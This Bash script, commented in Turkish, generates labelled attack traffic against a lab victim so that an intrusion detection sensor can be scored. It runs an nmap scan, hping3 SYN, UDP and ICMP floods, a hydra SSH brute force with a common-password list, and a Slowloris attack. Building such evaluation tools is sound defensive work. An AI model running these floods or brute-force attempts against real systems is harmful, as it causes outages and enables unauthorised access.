#!/bin/bash
# ============================================================
#  attack-runner.sh — Kontrollü saldırı senaryosu + GROUND TRUTH üreteci
#
#  SALDIRGAN VM üzerinde çalışır. Sırayla iyi huylu (benign) trafik ve
#  bilinen saldırıları üretir; her birinin başlangıç/bitiş zamanını ve
#  MITRE ATT&CK ID'sini ground_truth.csv'ye yazar. Bu dosya, sensörün
#  ürettiği logs/detections.jsonl ile evaluate_live.ipynb içinde eşleştirilip
#  GERÇEK precision/recall/FP (canlı sistem başarımı) hesaplanır.
#
#  ⚠️ YALNIZCA KENDİ İZOLE TEST LABORATUVARINDA çalıştırın (kendi VM'leriniz).
#
#  Kullanım (saldırgan VM, root):
#    sudo bash attack-runner.sh <KURBAN_IP> [DURATION_SN]
#  Örnek:
#    sudo bash attack-runner.sh 192.168.137.201 20
#
#  Saat senkronu: Kurban/Pi ve saldırgan aynı saat diliminde ve NTP ile
#  senkron olmalı (eşleştirme zaman penceresine dayanır).
# ============================================================
set -u

VICTIM="${1:-}"
DUR="${2:-20}"          # her saldırının süresi (sn)
GAP="${3:-8}"           # saldırılar arası dinlenme (sn) — pencereleri ayırır
OUT="${OUT:-ground_truth.csv}"

if [ -z "$VICTIM" ]; then
    echo "[HATA] Kurban IP gerekli.  Kullanım: sudo bash attack-runner.sh <KURBAN_IP> [SÜRE]"
    exit 1
fi

# Saldırganın kendi IP'si (kurbana giden arayüzden)
SRC=$(ip -o -4 route get "$VICTIM" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}')
[ -z "$SRC" ] && SRC=$(hostname -I | awk '{print $1}')

echo "============================================"
echo "  attack-runner — ground truth üreteci"
echo "  Saldırgan (src): $SRC"
echo "  Kurban   (dst):  $VICTIM"
echo "  Süre/saldırı:    ${DUR}s   Boşluk: ${GAP}s"
echo "  Çıktı:           $OUT"
echo "============================================"

# CSV başlığı (yoksa oluştur)
if [ ! -f "$OUT" ]; then
    echo "start_iso,end_iso,start_epoch,end_epoch,label,attack_type,mitre,src,dst,dst_port,tool" > "$OUT"
fi

have() { command -v "$1" >/dev/null 2>&1; }

# row LABEL ATTACK MITRE DST_PORT TOOL  — komutu çalıştırıp pencereyi kaydeder
# Komut, fonksiyona "$@" sonrası gelen kısımdır.
run_window() {
    local label="$1" attack="$2" mitre="$3" port="$4" tool="$5"; shift 5
    if [ -n "$tool" ] && ! have "$tool"; then
        echo "[ATLA] $attack — '$tool' kurulu değil (apt install $tool)."
        return
    fi
    local s_iso s_ep e_iso e_ep
    s_iso=$(date +%Y-%m-%dT%H:%M:%S); s_ep=$(date +%s)
    echo ">>> [$attack] başladı ($s_iso)"
    "$@" >/dev/null 2>&1
    e_iso=$(date +%Y-%m-%dT%H:%M:%S); e_ep=$(date +%s)
    echo "    [$attack] bitti   ($e_iso)"
    echo "$s_iso,$e_iso,$s_ep,$e_ep,$label,$attack,$mitre,$SRC,$VICTIM,$port,$tool" >> "$OUT"
    sleep "$GAP"
}

# ── Yardımcı saldırı komutları ──
benign_traffic() {
    # Normal kullanıcı davranışı: HTTP istekleri + ping
    for i in $(seq 1 "$DUR"); do
        curl -s -m 2 "http://$VICTIM/" >/dev/null 2>&1 || true
        ping -c 1 -W 1 "$VICTIM" >/dev/null 2>&1 || true
        sleep 1
    done
}
ssh_bruteforce() {
    if have hydra; then
        local wl; wl=$(mktemp)
        printf '123456\npassword\nroot\nadmin\ntoor\n12345678\nqwerty\n111111\nletmein\nubuntu\n' > "$wl"
        timeout "$DUR" hydra -l root -P "$wl" -t 8 -f "ssh://$VICTIM" >/dev/null 2>&1 || true
        rm -f "$wl"
    else
        # hydra yoksa: porta hızlı bağlantı denemeleri (>=20/sn brute-force kuralını tetikler)
        local end=$(( $(date +%s) + DUR ))
        while [ "$(date +%s)" -lt "$end" ]; do
            for j in $(seq 1 30); do timeout 1 bash -c "echo > /dev/tcp/$VICTIM/22" 2>/dev/null & done
            wait; sleep 0.2
        done
    fi
}

echo ""
echo "### Senaryo başlıyor — DEMO modunu kapatıp sensörü CANLI çalıştırdığınızdan emin olun. ###"
echo ""

# 1) İYİ HUYLU TABAN (FP ölçümü için temiz pencere) — MITRE yok
run_window BENIGN  BENIGN        -      0   ""        benign_traffic

# 2) Port tarama  (T1046 Network Service Discovery)
run_window ANOMALY PortScan      T1046  0   nmap      timeout "$DUR" nmap -sS -T4 -p 1-1024 "$VICTIM"

# 3) SYN flood    (T1498 Network DoS)
run_window ANOMALY SYN_Flood     T1498  80  hping3    timeout "$DUR" hping3 -S -p 80 --flood "$VICTIM"

# 4) UDP flood    (T1498)
run_window ANOMALY DoS_Flood     T1498  53  hping3    timeout "$DUR" hping3 --udp -p 53 --flood "$VICTIM"

# 5) ICMP flood   (T1498)
run_window ANOMALY DoS_Flood     T1498  0   hping3    timeout "$DUR" hping3 --icmp --flood "$VICTIM"

# 6) SSH brute force (T1110 Brute Force)
run_window ANOMALY BruteForce    T1110  22  ""        ssh_bruteforce

# 7) Yavaş HTTP DoS (T1499) — kural katmanı bunu KAÇIRABİLİR (dürüst FN örneği)
run_window ANOMALY Slowloris     T1499  80  slowhttptest  timeout "$DUR" slowhttptest -c 400 -H -i 10 -r 50 -u "http://$VICTIM/"

# 8) Kapanış benign penceresi
run_window BENIGN  BENIGN        -      0   ""        benign_traffic

echo ""
echo "Bitti. Ground truth: $OUT"
echo "Sensör tarafında oluşan logs/detections.jsonl ile birlikte evaluate_live.ipynb'a verin."
